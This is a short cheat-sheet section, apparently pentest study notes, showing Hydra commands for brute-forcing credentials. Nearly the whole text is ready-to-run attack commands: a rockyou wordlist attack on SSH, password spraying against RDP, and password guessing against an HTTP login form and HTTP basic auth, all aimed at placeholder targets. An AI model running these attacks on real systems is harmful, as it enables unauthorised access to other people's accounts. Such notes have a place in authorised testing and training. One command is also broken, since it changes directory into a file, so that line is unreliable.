### Hydra
Principle here is to gather a username by some other enumeration method. If none can be found then be sure to try `Administrator` on Windows and `root` on Linux.
```bash
cd /usr/share/wordlists/rockyou.txt; sudo gzip -d rockyou.txt.gz
hydra -l <candidate username> -P /usr/share/wordlists/rockyou.txt -s <target port> ssh://<target IP>
```
Assuming you have secured a valid password by some other means but without a username you can leverage _password spraying_.
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "lolzageVerySecurity" rdp://<target IP>
```
Hitting an HTTP endpoint:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt <target IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
Hitting a page using http basic auth:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target IP> http-get
```
